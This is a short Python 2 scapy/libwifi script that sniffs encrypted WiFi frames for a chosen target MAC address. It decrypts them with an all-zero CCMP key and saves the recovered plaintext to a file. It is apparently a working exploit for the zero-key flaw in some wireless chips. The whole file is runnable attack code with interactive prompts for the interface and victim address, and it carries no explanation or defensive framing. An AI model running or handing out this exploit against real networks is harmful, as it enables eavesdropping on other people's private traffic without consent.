#!/usr/bin/python2
from scapy.all import *
import libwifi
from libwifi import *

f = open("Data_Decrypted", "w+")
def checkEncrypt(pkt):
	if(dot11_is_encrypted_data(pkt)):
            data = decrypt_ccmp(pkt, "\x00" * 16)
            #pkt.show()
            print("Data: %s\n" %(data))
            if(data.startswith("\xAA\xAA\x03\x00\x00\x00")):
                print("-------- DATA DECRYPTED ----------\n")
                print("Data: %s" %(data))
                f.write(data)
                pkt.show()
                print("----------------------------------\n")

interface = raw_input("Enter the interface to use:\n")
mac = raw_input("Enter mac address:\n")
#interface = 'wlp0s20f0u1mon'
sniff(iface=interface, prn=checkEncrypt, filter="ether host " + mac, lfilter=lambda pkt: (Dot11CCMP in pkt or Dot11TKIP in pkt or Dot11Encrypted in pkt))
f.close()
